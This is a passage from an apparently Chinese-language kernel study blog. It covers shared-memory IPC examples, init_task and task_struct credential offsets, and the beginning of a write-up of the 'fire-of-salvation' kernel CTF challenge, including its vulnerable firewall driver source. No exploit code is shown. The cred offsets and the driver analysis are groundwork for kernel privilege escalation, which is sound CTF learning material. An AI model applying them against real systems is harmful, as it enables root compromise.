</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">else </span><span style="color:#65737e;">// 有其他进程在写数据，不能读取数据
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 把共享内存从当前进程中分离
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">shmdt</span><span style="color:#c0c5ce;">(shm) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">shmdt failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 删除共享内存
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">shmctl</span><span style="color:#c0c5ce;">(shmid, IPC_RMID, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">shmctl(IPC_RMID) failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_SUCCESS);
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="shmwrite-c">shmwrite.c</h3><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/shm.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">shmdata.h</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*shm = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shared_use_st *shared = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buffer[BUFSIZ + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]; </span><span style="color:#65737e;">// 用于保存输入的文本
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> shmid;
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 创建共享内存
</span><span style="color:#c0c5ce;">    shmid = </span><span style="color:#8fa1b3;">shmget</span><span style="color:#c0c5ce;">((key_t)</span><span style="color:#d08770;">1234</span><span style="color:#c0c5ce;">, sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shared_use_st), </span><span style="color:#d08770;">0666</span><span style="color:#c0c5ce;">|IPC_CREAT);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(shmid == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">shmget failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 将共享内存连接到当前的进程地址空间
</span><span style="color:#c0c5ce;">    shm = </span><span style="color:#8fa1b3;">shmat</span><span style="color:#c0c5ce;">(shmid, (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(shm == (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">shmat failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Memory attched at </span><span style="color:#d08770;">%X</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">)shm);
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 设置共享内存
</span><span style="color:#c0c5ce;">    shared = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> shared_use_st *)shm;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">// 向共享内存中写数据
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 数据还没有被读取，则等待数据被读取，不能向共享内存中写入文本
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(shared-&gt;written == </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Waiting...</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 向共享内存中写入数据
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Enter some text: </span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">fgets</span><span style="color:#c0c5ce;">(buffer, BUFSIZ, stdin);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(shared-&gt;text, buffer, TEXT_SZ);
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 写完数据，设置written使共享内存段可读
</span><span style="color:#c0c5ce;">        shared-&gt;written = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 输入了end，退出循环（程序）
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strncmp</span><span style="color:#c0c5ce;">(buffer, &quot;</span><span style="color:#a3be8c;">end</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 把共享内存从当前进程中分离
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">shmdt</span><span style="color:#c0c5ce;">(shm) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">shmdt failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_SUCCESS);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><img src="https://md.buptmerak.cn/uploads/a9c50c12-bb6c-4da8-af54-8952a47fa9d9.png" alt="" /></p>
<h3 id="an-quan-xing">安全性</h3><p>上面程序不安全，因为对<code>written</code>判断然后决定是否写入的操作不是原子操作，需要进程同步机制，保证进入临界区的操作是原子操作</p>
<h1 id="init-task">init_task</h1><p><code>init_task</code>的定义是 <code>struct task_struct init_task = INIT_TASK(init_task)</code>
是系统创建的第一个进程，称为0号进程</p>
<p>下面节选了部分定义，采用了gcc的结构体初始化方式为其进行直接赋值生成</p>
<p><code>/init/init_task.c</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;"> * Set up the first task table, touch at your own risk!. Base=0,
</span><span style="color:#65737e;"> * limit=0x1fffff (=2MB)
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> task_struct </span><span style="color:#8fa1b3;">init_task
</span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> CONFIG_ARCH_TASK_STRUCT_ON_STACK
</span><span style="color:#c0c5ce;">    __init_task_data
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">= {
</span><span style="color:#c0c5ce;">    ......
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">__state	</span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">stack		</span><span style="color:#c0c5ce;">= init_stack,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">usage		</span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">REFCOUNT_INIT</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">),
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">flags		</span><span style="color:#c0c5ce;">= PF_KTHREAD,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">prio		</span><span style="color:#c0c5ce;">= MAX_PRIO - </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">static_prio	</span><span style="color:#c0c5ce;">= MAX_PRIO - </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">normal_prio	</span><span style="color:#c0c5ce;">= MAX_PRIO - </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">policy		</span><span style="color:#c0c5ce;">= SCHED_NORMAL,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">cpus_ptr	</span><span style="color:#c0c5ce;">= &amp;init_task.</span><span style="color:#bf616a;">cpus_mask</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">user_cpus_ptr	</span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">cpus_mask	</span><span style="color:#c0c5ce;">= CPU_MASK_ALL,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">nr_cpus_allowed</span><span style="color:#c0c5ce;">= NR_CPUS,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">mm		</span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">active_mm	</span><span style="color:#c0c5ce;">= &amp;init_mm,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">restart_block	</span><span style="color:#c0c5ce;">= {
</span><span style="color:#c0c5ce;">		.</span><span style="color:#bf616a;">fn </span><span style="color:#c0c5ce;">= do_no_restart_syscall,
</span><span style="color:#c0c5ce;">	},
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">se		</span><span style="color:#c0c5ce;">= {
</span><span style="color:#c0c5ce;">		.</span><span style="color:#bf616a;">group_node 	</span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">LIST_HEAD_INIT</span><span style="color:#c0c5ce;">(init_task.</span><span style="color:#bf616a;">se</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">group_node</span><span style="color:#c0c5ce;">),
</span><span style="color:#c0c5ce;">	},
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">rt		</span><span style="color:#c0c5ce;">= {
</span><span style="color:#c0c5ce;">		.</span><span style="color:#bf616a;">run_list	</span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">LIST_HEAD_INIT</span><span style="color:#c0c5ce;">(init_task.</span><span style="color:#bf616a;">rt</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">run_list</span><span style="color:#c0c5ce;">),
</span><span style="color:#c0c5ce;">		.</span><span style="color:#bf616a;">time_slice	</span><span style="color:#c0c5ce;">= RR_TIMESLICE,
</span><span style="color:#c0c5ce;">	},
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">tasks		</span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">LIST_HEAD_INIT</span><span style="color:#c0c5ce;">(init_task.</span><span style="color:#bf616a;">tasks</span><span style="color:#c0c5ce;">),
</span><span style="color:#c0c5ce;">};
</span><span style="color:#8fa1b3;">EXPORT_SYMBOL</span><span style="color:#c0c5ce;">(init_task);
</span></pre>
<p>结构体<code>task_struct</code>中有三个成员很重要</p>
<ul>
<li>tasks（<code>struct list_head</code>，<code>next</code>, <code>prev</code>）指向前后task_struct的指针（偏移0x298）（其实是指向前后task_struct的tasks处，可以根据这里索引到task_struct的成员变量）</li>
<li>pid进程号（偏移0x398）</li>
<li>real_cred（偏移0x538）</li>
<li>cred进程的凭证（偏移0x540）</li>
</ul>
<h1 id="userfaultfd">userfaultfd</h1><p>https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/</p>
<h1 id="fire-of-salvation">fire-of-salvation</h1><pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">Elastic objects in kernel have more power than you think. A kernel config file is provided as well, but some of the important options include:
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">CONFIG_SLAB=y
</span><span style="color:#c0c5ce;">CONFIG_SLAB_FREELIST_RANDOM=y
</span><span style="color:#c0c5ce;">CONFIG_SLAB_FREELIST_HARDEN=y
</span><span style="color:#c0c5ce;">CONFIG_STATIC_USERMODEHELPER=y
</span><span style="color:#c0c5ce;">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;
</span><span style="color:#c0c5ce;">CONFIG_FG_KASLR=y
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">SMEP, SMAP, and KPTI are of course on. Note that this is an easier variation of the Wall of Perdition challenge.
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">hint: Using the correct elastic object you can achieve powerful primitives such as arb read and arb write. While arb read for this object has been documented, arb write has not to the extent of our knowledge (it is not a 0 day tho so don&#39;t worry).
</span></pre>
<p>开启了很多保护和额外加固，注意：</p>
<ul>
<li><code>FG-KASLR</code>（Function Granular Kernel Address Space Layout Randomization)：细粒度的kaslr，函数级别上的kaslr优化</li>
<li><code>STATIC_USERMODE_HELPER</code>禁掉了对于modprobe_path和core_pattern的利用（只读区域）</li>
<li>使用了SLAB分配器而不是SLUB</li>
</ul>
<p>题目源码在出题人的博客中已经给出，下面直接根据源码进行分析</p>
<p>题目本身实现了一个内核态的防火墙驱动，定义了针对ipv4数据包的出入站规则</p>
<h2 id="user-rule-t-rule-t">user_rule_t && rule_t</h2><p>定义了两个结构体，描述过滤规则</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">typedef struct
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> iface[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> name[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> ip[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> netmask[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    uint8_t idx;
</span><span style="color:#c0c5ce;">    uint8_t type;
</span><span style="color:#c0c5ce;">    uint16_t proto;
</span><span style="color:#c0c5ce;">    uint16_t port;
</span><span style="color:#c0c5ce;">    uint8_t action;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> EASY_MODE
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> desc[DESC_MAX];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">} user_rule_t;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">typedef struct
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> iface[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> name[</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    uint32_t ip;
</span><span style="color:#c0c5ce;">    uint32_t netmask;
</span><span style="color:#c0c5ce;">    uint16_t proto;
</span><span style="color:#c0c5ce;">    uint16_t port;
</span><span style="color:#c0c5ce;">    uint8_t action;
</span><span style="color:#c0c5ce;">    uint8_t is_duplicated;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> EASY_MODE
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> desc[DESC_MAX];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">} rule_t;
</span></pre>
<h2 id="init-firewall">init_firewall</h2><pre style="background-color:#2b303b;">
<span style="color:#65737e;">// 初始化两个全局list
</span><span style="color:#65737e;">// firewall_rules_in：存储指向入站规则的指针
</span><span style="color:#65737e;">// firewall_rules_out：存储指向出站规则的指针
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">firewall_rules_in = </span><span style="color:#8fa1b3;">kzalloc</span><span style="color:#c0c5ce;">(sizeof(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*) * MAX_RULES, GFP_KERNEL);
</span><span style="color:#c0c5ce;">    firewall_rules_out = </span><span style="color:#8fa1b3;">kzalloc</span><span style="color:#c0c5ce;">(sizeof(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*) * MAX_RULES, GFP_KERNEL);
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// 注册hook函数
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">nf_register_net_hook</span><span style="color:#c0c5ce;">(&amp;init_net, &amp;in_hook) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Cannot register nf hook!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">nf_register_net_hook</span><span style="color:#c0c5ce;">(&amp;init_net, &amp;out_hook) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Cannot register nf hook!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span></pre>
<p>对应结构体如下，相关结构体的函数在前面介绍netfilter的时候已然学习过了</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static struct</span><span style="color:#c0c5ce;"> nf_hook_ops in_hook = {
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">hook        </span><span style="color:#c0c5ce;">= firewall_inbound_hook,
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">hooknum     </span><span style="color:#c0c5ce;">= NF_INET_PRE_ROUTING,
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">pf          </span><span style="color:#c0c5ce;">= PF_INET,
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">priority    </span><span style="color:#c0c5ce;">= NF_IP_PRI_FIRST
</span><span style="color:#c0c5ce;">};
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static struct</span><span style="color:#c0c5ce;"> nf_hook_ops out_hook = {
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">hook        </span><span style="color:#c0c5ce;">= firewall_outbound_hook,
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">hooknum     </span><span style="color:#c0c5ce;">= NF_INET_POST_ROUTING,
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">pf          </span><span style="color:#c0c5ce;">= PF_INET,
</span><span style="color:#c0c5ce;">  .</span><span style="color:#bf616a;">priority    </span><span style="color:#c0c5ce;">= NF_IP_PRI_FIRST
</span><span style="color:#c0c5ce;">};
</span></pre>
<h2 id="firewall-inbound-hook-firewall-outbound-hook">firewall_inbound_hook && firewall_outbound_hook</h2><p><code>firewall_inbound_hook</code>函数在数据包进站时被调用，函数扫描存在的过滤规则并调用<code>process_rule</code>处理对应的数据包</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">uint32_t </span><span style="color:#8fa1b3;">firewall_inbound_hook</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">priv</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sk_buff *</span><span style="color:#bf616a;">skb</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> nf_hook_state *</span><span style="color:#bf616a;">state</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i;
</span><span style="color:#c0c5ce;">    uint32_t ret;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; MAX_RULES; i++)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(firewall_rules_in[i])
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            ret = </span><span style="color:#8fa1b3;">process_rule</span><span style="color:#c0c5ce;">(skb, firewall_rules_in[i], INBOUND, i);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret != SKIP)
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> NF_ACCEPT;
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>firewall_outbound_hook</code>函数在数据包出战时被调用</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">uint32_t </span><span style="color:#8fa1b3;">firewall_outbound_hook</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">priv</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sk_buff *</span><span style="color:#bf616a;">skb</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> nf_hook_state *</span><span style="color:#bf616a;">state</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i;
</span><span style="color:#c0c5ce;">    uint32_t ret;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; MAX_RULES; i++)
</span><span style="color:#c0c5ce;">    {
